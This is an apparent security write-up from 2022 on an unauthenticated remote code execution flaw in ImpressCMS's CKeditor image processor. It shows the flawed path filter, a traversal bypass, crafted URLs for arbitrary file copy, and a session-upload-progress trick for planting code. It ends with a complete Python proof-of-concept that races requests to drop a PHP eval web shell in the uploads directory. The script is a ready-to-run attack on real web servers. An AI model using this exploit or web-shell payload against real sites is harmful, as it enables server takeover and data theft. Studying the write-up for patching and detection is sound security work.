### impressCMS - unauthenticated code execution

###### 12-02-2022 - rekter0

```
ImpressCMS is an open source content management system for building and maintaining dynamic web sites, written in the PHP programming language and using a MySQL database

```

| --- | --- |
| **Versions affected** | < 1.4.2 pre-release, < v2.0.0 alpha 11 |

## **# Summary**

CKeditor image processor in impressCMS used to have insufficient filter for user supplied image path gives attacker possible path traversal leading to arbitrary file copy/overwrite, with default php config for session upload progress this could lead to pre-auth RCE.

## **# Vulnerability analysis**

**Arbitrary file copy**

`htdocs/editors/CKeditor/ceditfinder/imageeditor/processImage.php`

```
> header("Content-Type: text/plain"); $imageName = str_replace(array("../", "./"), "", $_REQUEST['imageName']);
> $origName = str_replace(array("../", "./"), "", $_REQUEST['origName']);
if (empty($origName)) {
    echo "{imageFound:false}"; exit;
}
...
...
...
...
$action = $_REQUEST["action"]; $fileInfo = pathinfo($imageName); $extension = $fileInfo['extension']; switch ($action) {
    case "undo":  // This is actually revert now, as only revert is supported
        if (file_exists($origName)) {
>           unlink($imageName); copy($origName, $imageName); }
        break;

```

When `undo` action is performed, `copy()` function was called with `$_REQUEST['origName']` and `$_REQUEST['imageName']` parameters controlled by attacker

**Path traversal**

`str_replace` is not recursive

```
~$ php -a
Interactive mode enabled

php > var_dump(str_replace(array("../", "./"), "", '.....///'));
string(3) "../"

```

`.....///` after going through the filter becomes `../`

To copy an arbitrary file, exploit could have been the following:

```
http://[%CMS_HOST%]/editors/CKeditor/ceditfinder/imageeditor/processImage.php?imageName=[%SOURCE_FILE%]&origName=[%DEST_FILE%]&action=undo

```

similar vulnerability is also triggered by the action "save"

vulnerable code snippet:

```
<?php
case "save":  // Copy working image back to original
        copy($imageName, $origName); break;

```

**Remote Code Execution**

Since we got an arbitrary file copy, all we need is to have our malicious php code somewhere on the server and we copy it to a public directory with .php extension,

there's some modules like forum that allow a user to upload a picture as attachement, we can embed our malicious php code inside the picture metadata.

but we need a more reliable way, since upload function can be disabled.

luckily php is shiped with `upload_progress` feature which could help us get our code on a file in the server.
Ref: <https://blog.orange.tw/2018/10/>

TL;DR, by providing PHP\_SESSION\_UPLOAD\_PROGRESS in multipart POST data, php will enable session for you and containing value from post data parameter PHP\_SESSION\_UPLOAD\_PROGRESS, where we will have our php code

to exploit this, we create the session file, then we copy it.

there's a bit of a race here,

to properly exploit this, we a pool of multipart post requests with cookie PHPSESSID=letspwnimpressCMS and POST parameter PHP\_SESSION\_UPLOAD\_PROGRESS containing our payload `<?=eval($_GET[a]);exit;//` to

```
http://[%CMS_HOST%]/editors/CKeditor/ceditfinder/imageeditor/processImage.php

```

and make another thread pool to trigger the file copy to guarantee the success of the exploit.

```
http://[%CMS_HOST%]/editors/CKeditor/ceditfinder/imageeditor/processImage.php?origName=/var/lib/php/sessions/sess_letspwnimpressCMS&imageName=.....///.....///.....///.....///uploads/aa.php&action=save

```

this will copy session file to uploads directory with file name aa.php, and the shell would be found at

```
http://[%CMS_HOST%]/uploads/aa.php?a=phpinfo();

```

final exploit code, this is just a poc made for default php config, use at your own risk

```
import sys
import string
import requests
from multiprocessing.dummy import Pool as ThreadPool
if len(sys.argv)<3:
    print('python '+sys.argv[0]+' http://localhost 1')
    print('python '+sys.argv[0]+' http://localhost 2')
    exit()
HOST = sys.argv[1]
PATH = '/editors/CKeditor/ceditfinder/imageeditor/processImage.php'
sess_name = 'letspwnimpressCMS'
headers = {
    'Connection': 'close',
    'Cookie': 'PHPSESSID=' + sess_name
}
payload = '<?=eval($_GET[a]);exit;//'
def runner1(i):
    data = {
        'PHP_SESSION_UPLOAD_PROGRESS': 'A' + payload + 'A'
    }
    while 1:
        fp = open('/etc/hosts', 'rb')
        r = requests.post(HOST+PATH, files={'f': fp}, data=data, headers=headers)
        fp.close()
def runner2(i):
    filename = '/var/lib/php/sessions/sess_' + sess_name
    while 1:
        url = HOST+PATH+'?origName=.....///.....///.....///.....///uploads/aa.php&imageName=/var/lib/php/sessions/sess_letspwnimpressCMS&action=save'
        r = requests.get(url, headers=headers)
        c = r.content
        url2 = requests.get(HOST+'/uploads/aa.php?a=echo%20%2799999999999999999999999999999%27;copy(%27aa.php%27,%27bb.php%27);')
        if('99999999999999999999999999999' in url2.text):
            print('[+] done!')
            print('[!] Check '+HOST+'/uploads/bb.php?a=phpinfo();')
            exit()

if sys.argv[2] == '1':
    runner = runner1
else:
    runner = runner2

pool = ThreadPool(32)
result = pool.map_async( runner, range(32) ).get(0xffff)

```

* terminal 1

```
$ python3 a.py http://localhost/ 1
